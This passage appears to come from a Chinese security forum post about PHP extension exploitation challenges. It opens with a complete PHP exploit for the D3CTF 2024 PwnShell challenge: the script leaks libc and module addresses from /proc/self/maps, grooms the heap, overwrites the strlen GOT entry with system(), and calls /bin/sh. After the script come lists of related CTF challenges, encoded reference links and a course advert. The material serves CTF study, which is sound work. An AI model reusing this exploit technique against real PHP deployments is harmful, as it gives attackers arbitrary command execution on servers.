
```php
<?php
$vuln_base = 0;
$libc_base = 0;
$libc = "";
$mbase = "";
function u64($leak){
$leak = strrev($leak);
$leak = bin2hex($leak);
$leak = hexdec($leak);
return $leak;
}
function p64($addr){
$addr = dechex($addr);
$addr = hex2bin($addr);
$addr = strrev($addr);
$addr = str_pad($addr, 8, "\x00");
return $addr;
}
function leakaddr($buffer){
global $libc, $mbase;
$p = '/([0-9a-f].)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/';
$p1 = '/([0-9a-f]+)\-[0-9a-f]+ .* \/home\/l1qu1d\/pwn\/chall\/php_pwn\/pwnshelldock\/stuff\/vuln.so/';
preg_match_all($p, $buffer, $libc);
preg_match_all($p1, $buffer, $mbase);
return "";
}
ob_start("leakaddr");
include("/proc/self/maps");
$buffer = ob_get_contents();
ob_end_flush();
leakaddr($buffer);
$vuln_base = hexdec($mbase[1][0]);
$libc_base = $vuln_base + 0x31a3000;
$strlen_got = $vuln_base + 0x4020;
$system_addr = $libc_base + 0x58750;
echo "Libc base   => " . dechex($libc_base) . "\n";
echo "game base   => " . dechex($vuln_base) . "\n";
echo "strlen got  => " . dechex($strlen_got) . "\n";
echo "system addr => " . dechex($system_addr) . "\n";
addHacker("aaaaaaaaaaaaaaaaaaaaaaaa","bbbbbbb");
addHacker("cccccccccccccccccccccccc","ddddddd");
addHacker("cccccccccccccccccccccccc","ddddddd");
addHacker("/bin/sh","/bin/sh");
addHacker("cccccccc","ddddddd");
addHacker("cccccccc","ddddddd");
addHacker("cccccccc","ddddddd");
addHacker("cccccccc","ddddddd");
addHacker("cccccccc","ddddddd");
addHacker("cccccccc","ddddddd");
addHacker("cccccccc","ddddddd");
addHacker("cccccccc","ddddddd");
addHacker("cccccccc","ddddddd");
addHacker("cccccccc","ddddddd");
removeHacker(13);
addHacker("aaaaaaaaaaaaaaaaaaaaaaaa","hhhhhhh");
removeHacker(12);
addHacker("aaaaaaaaaaaaaaaaaaaaaaaa","ffffffff");
editHacker(13, p64(0x18) . "hhhhhhhh" . p64($strlen_got));
editHacker(14, p64($system_addr));
displayHacker(3);
?>
```

题目来源：D3CTF 2024 PwnShell

参考：be7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1j5&6j5h3&6#2P5q4)9J5k6h3!0J5k6#2)9J5c8U0t1H3x3U0c8Q4x3V1j5H3y4q4)9J5c8U0t1&6i4K6u0r3k6o6y4U0N6r3j5J5x3o6t1@1i4K6u0r3K9h3&6V1k6i4S2Q4x3X3g2Z5N6r3#2D9

### 堆UAF：hackphp

题目来源：D3CTF 2021 hackphp

参考：
e58K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6g2c8g2y4#2M7r3g2J5c8$3q4@1k6g2)9J5c8V1b7K6b7#2c8r3i4K6u0V1f1$3!0#2M7X3y4W2i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8X3S2S2j5$3E0H3K9s2m8Q4x3V1k6W2P5s2m8Q4x3X3g2H3K9s2l9`.
9e4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0t1K6y4e0t1K6y4#2)9J5x3$3R3J5i4K6u0V1y4b7`.`.

### UAF：phpmaster

题目来源：第二届长城杯半决赛 phpmaster

参考：https://bbs.kanxue.com/thread-286086.htm

## 参考文章

55fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0t1H3y4o6b7H3y4l9`.`.

56cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3I4*7K9o6q4Q4x3X3g2Y4K9i4c8Z5N6h3u0Q4x3X3g2A6L8#2)9J5c8Y4m8G2M7%4c8K6i4K6u0r3f1p5S2b7i4K6u0V1f1$3!0Q4x3X3c8b7N6$3&6Q4x3V1k6Q4x3U0y4*7k6h3&6V1i4K6g2X3M7r3q4J5M7$3g2Q4y4h3k6H3j5i4u0S2L8h3g2@1k6i4u0K6

38eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2T1L8$3!0C8M7%4c8S2j5$3E0Q4x3X3g2U0L8W2)9J5c8Y4u0W2j5h3c8Q4x3V1k6H3K9s2l9%4i4K6u0V1K9h3&6@1k6i4u0F1j5h3I4Q4x3V1j5%4i4K6u0V1K9h3#2H3L8r3g2E0k6h3&6@1i4K6u0W2L8h3b7`.

ba1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5N6h3q4F1P5s2g2S2L8X3u0D9K9h3&6Y4j5X3I4A6L8X3N6Q4x3X3g2Y4K9i4c8Z5N6h3u0Q4x3X3g2A6L8#2)9J5c8X3y4@1k6W2)9J5c8Y4m8%4L8W2)9J5c8U0t1H3x3U0m8Q4x3V1j5H3y4g2)9J5c8U0l9#2i4K6u0r3L8h3W2^5N6s2g2J5k6g2)9J5c8R3`.`.

## 题目附件

f17K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4P5W2g2G2K9e0M7$3P5e0g2y4L8#2g2a6h3g2m8K6g2W2k6K9N6X3&6E0f1g2)9K6c8Y4m8%4k6q4)9K6c8s2R3@1z5h3j5`.

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

[#专题](https://bbs.kanxue.com/forum-171-1-186.htm)

[#基础知识](https://bbs.kanxue.com/forum-171-1-180.htm)
